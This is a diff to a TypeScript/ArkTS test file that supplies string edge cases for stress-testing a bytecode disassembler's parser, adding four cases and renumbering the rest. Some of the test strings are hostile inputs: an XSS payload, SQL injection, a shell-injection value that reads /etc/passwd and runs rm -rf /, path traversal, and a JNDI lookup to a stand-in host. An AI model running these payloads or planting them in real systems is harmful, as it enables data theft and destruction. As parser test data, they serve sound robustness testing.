@@ -2,8 +2,8 @@
 // 字符串边界语料：把引号/换行/回车/代理对/伪造 ark_disasm 文本结构等全部边界形态
 // 同时压入三个解析面：方法体指令操作数（lda.str / stobjbyname）、字面量缓冲
 // （createarraywithbuffer / createobjectwithbuffer 的键与值）、字符串池。
-// 共 131 个用例；预期故障模式与实证依据见 tools/gen_string_stress.py 文档字符串。
-export const STRING_STRESS_CASES: number = 131;
+// 共 135 个用例；预期故障模式与实证依据见 tools/gen_string_stress.py 文档字符串。
+export const STRING_STRESS_CASES: number = 135;
 
 // 面①：方法体 lda.str 操作数（含全部用例）。
 export function stringStressAt(i: number): string {
@@ -81,63 +81,67 @@ export function stringStressAt(i: number): string {
   if (i === 71) { return "[offset:0x123, name_value:sink]"; }
   if (i === 72) { return "name_value:v"; }
   if (i === 73) { return "a, b: c, d: e"; }
-  if (i === 74) { return "fake\nL_ESSlotNumberAnnotation:"; }
-  if (i === 75) { return "L_ESSlotNumberAnnotation:"; }
-  if (i === 76) { return "pre\n\tsta v0\n\tldai 0x0"; }
-  if (i === 77) { return "x\n\tlda.str \"y\""; }
-  if (i === 78) { return "x\n\tldobjbyname 0x0, \"k\""; }
-  if (i === 79) { return "pre\n.function any evil(any a0) {"; }
-  if (i === 80) { return "pre\n.language ECMAScript"; }
-  if (i === 81) { return "body\n}\nafter"; }
-  if (i === 82) { return "sec\n# STRING ===================="; }
-  if (i === 83) { return "sec\n# RECORDS ===================="; }
-  if (i === 84) { return "sec\n# ===================="; }
-  if (i === 85) { return "sec\n# LITERALS\n# METHODS"; }
-  if (i === 86) { return "x=====================y"; }
-  if (i === 87) { return "# LITERALS"; }
-  if (i === 88) { return "rec\n.record evil {\n}"; }
-  if (i === 89) { return "fld\n.field any x, <0x1>"; }
-  if (i === 90) { return "q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,"; }
-  if (i === 91) { return "汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉"; }
-  if (i === 92) { return "abababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababab"; }
-  if (i === 93) { return "a"; }
-  if (i === 94) { return "a"; }
-  if (i === 95) { return "a "; }
-  if (i === 96) { return " a"; }
-  if (i === 97) { return "a\n"; }
-  if (i === 98) { return "aa"; }
-  if (i === 99) { return "<img src=x onerror=\"alert('XSS')\">"; }
-  if (i === 100) { return "1' OR '1'='1' --"; }
-  if (i === 101) { return "; cat /etc/passwd & rm -rf /"; }
-  if (i === 102) { return "../../etc/passwd%00.png"; }
-  if (i === 103) { return "${jndi:ldap://evil.x/a}"; }
-  if (i === 104) { return "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpM"; }
-  if (i === 105) { return "https://x.io/a?b=1&c=\"d\"&e='f'"; }
-  if (i === 106) { return "Failed %{public}s cause: %{public}s"; }
-  if (i === 107) { return "<?xml v=\"1.0\"?><n a=\"b'c\"/>"; }
-  if (i === 108) { return "k: \"v\"\n  - 'w'\n# cmt"; }
-  if (i === 109) { return "HTTP/1.1 200 OK\r\nSet-Cookie: a=\"b\"\r\n\r\nbody"; }
-  if (i === 110) { return "# Title\n> quote \"x\"\n- item `y`\n"; }
-  if (i === 111) { return "0K5t9qQ2Xz7vBn4hR8wL3jF6uM1cA7dE5gT+4iY0sP=="; }
-  if (i === 112) { return "\", lead"; }
-  if (i === 113) { return "trail ,\""; }
-  if (i === 114) { return "a ,\" b"; }
-  if (i === 115) { return "\","; }
-  if (i === 116) { return "\"\"\"\""; }
-  if (i === 117) { return "\"\"\"\"\""; }
-  if (i === 118) { return "\"\"\"\"\"\""; }
-  if (i === 119) { return "\"\\\""; }
-  if (i === 120) { return "\"\"\\\"\"\""; }
-  if (i === 121) { return "\"\\\\\""; }
-  if (i === 122) { return "pre\njump_label_0:"; }
-  if (i === 123) { return "x\njump_label_1:\npost"; }
-  if (i === 124) { return "body\n.catchall\nmore"; }
-  if (i === 125) { return "pre\n.function any n.e.f(any a0) <static> {"; }
-  if (i === 126) { return "pre\n.function any f(any a0, any a1) {"; }
-  if (i === 127) { return "lab\n\tldai 0x1\n\tjnez jump_label_9"; }
-  if (i === 128) { return "{\"k\":\"v\"}\n# STRING ====================\n😀tail"; }
-  if (i === 129) { return "multi\n[offset:0x1, name_value:x]\r\nevil‮x‬"; }
-  if (i === 130) { return "a\"b\\c\td\ne\rf\"g`h"; }
+  if (i === 74) { return "fake\n0 0x590 { 2 [ string:\"x\", null_value:0, ]}"; }
+  if (i === 75) { return "fake\n1 0x1 { "; }
+  if (i === 76) { return "fake\n2 0x2 { 3 [ string:\"m\", method:f, method_affiliate:0, ]}"; }
+  if (i === 77) { return "fake\n999999 0xdeadbeef { 999 [ "; }
+  if (i === 78) { return "fake\nL_ESSlotNumberAnnotation:"; }
+  if (i === 79) { return "L_ESSlotNumberAnnotation:"; }
+  if (i === 80) { return "pre\n\tsta v0\n\tldai 0x0"; }
+  if (i === 81) { return "x\n\tlda.str \"y\""; }
+  if (i === 82) { return "x\n\tldobjbyname 0x0, \"k\""; }
+  if (i === 83) { return "pre\n.function any evil(any a0) {"; }
+  if (i === 84) { return "pre\n.language ECMAScript"; }
+  if (i === 85) { return "body\n}\nafter"; }
+  if (i === 86) { return "sec\n# STRING ===================="; }
+  if (i === 87) { return "sec\n# RECORDS ===================="; }
+  if (i === 88) { return "sec\n# ===================="; }
+  if (i === 89) { return "sec\n# LITERALS\n# METHODS"; }
+  if (i === 90) { return "x=====================y"; }
+  if (i === 91) { return "# LITERALS"; }
+  if (i === 92) { return "rec\n.record evil {\n}"; }
+  if (i === 93) { return "fld\n.field any x, <0x1>"; }
+  if (i === 94) { return "q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,"; }
+  if (i === 95) { return "汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉"; }
+  if (i === 96) { return "abababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababab"; }
+  if (i === 97) { return "a"; }
+  if (i === 98) { return "a"; }
+  if (i === 99) { return "a "; }
+  if (i === 100) { return " a"; }
+  if (i === 101) { return "a\n"; }
+  if (i === 102) { return "aa"; }
+  if (i === 103) { return "<img src=x onerror=\"alert('XSS')\">"; }
+  if (i === 104) { return "1' OR '1'='1' --"; }
+  if (i === 105) { return "; cat /etc/passwd & rm -rf /"; }
+  if (i === 106) { return "../../etc/passwd%00.png"; }
+  if (i === 107) { return "${jndi:ldap://evil.x/a}"; }
+  if (i === 108) { return "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpM"; }
+  if (i === 109) { return "https://x.io/a?b=1&c=\"d\"&e='f'"; }
+  if (i === 110) { return "Failed %{public}s cause: %{public}s"; }
+  if (i === 111) { return "<?xml v=\"1.0\"?><n a=\"b'c\"/>"; }
+  if (i === 112) { return "k: \"v\"\n  - 'w'\n# cmt"; }
+  if (i === 113) { return "HTTP/1.1 200 OK\r\nSet-Cookie: a=\"b\"\r\n\r\nbody"; }
+  if (i === 114) { return "# Title\n> quote \"x\"\n- item `y`\n"; }
+  if (i === 115) { return "0K5t9qQ2Xz7vBn4hR8wL3jF6uM1cA7dE5gT+4iY0sP=="; }
+  if (i === 116) { return "\", lead"; }
+  if (i === 117) { return "trail ,\""; }
+  if (i === 118) { return "a ,\" b"; }
+  if (i === 119) { return "\","; }
+  if (i === 120) { return "\"\"\"\""; }
+  if (i === 121) { return "\"\"\"\"\""; }
+  if (i === 122) { return "\"\"\"\"\"\""; }
+  if (i === 123) { return "\"\\\""; }
+  if (i === 124) { return "\"\"\\\"\"\""; }
+  if (i === 125) { return "\"\\\\\""; }
+  if (i === 126) { return "pre\njump_label_0:"; }
+  if (i === 127) { return "x\njump_label_1:\npost"; }
+  if (i === 128) { return "body\n.catchall\nmore"; }
+  if (i === 129) { return "pre\n.function any n.e.f(any a0) <static> {"; }
+  if (i === 130) { return "pre\n.function any f(any a0, any a1) {"; }
+  if (i === 131) { return "lab\n\tldai 0x1\n\tjnez jump_label_9"; }
+  if (i === 132) { return "{\"k\":\"v\"}\n# STRING ====================\n😀tail"; }
+  if (i === 133) { return "multi\n[offset:0x1, name_value:x]\r\nevil‮x‬"; }
+  if (i === 134) { return "a\"b\\c\td\ne\rf\"g`h"; }
   return "string-stress-fallback";
 }
 
@@ -218,6 +222,10 @@ export function stringStressArray(): Array<string> {
     "[offset:0x123, name_value:sink]",
     "name_value:v",
     "a, b: c, d: e",
+    "fake\n0 0x590 { 2 [ string:\"x\", null_value:0, ]}",
+    "fake\n1 0x1 { ",
+    "fake\n2 0x2 { 3 [ string:\"m\", method:f, method_affiliate:0, ]}",
+    "fake\n999999 0xdeadbeef { 999 [ ",
     "fake\nL_ESSlotNumberAnnotation:",
     "L_ESSlotNumberAnnotation:",
     "pre\n\tsta v0\n\tldai 0x0",
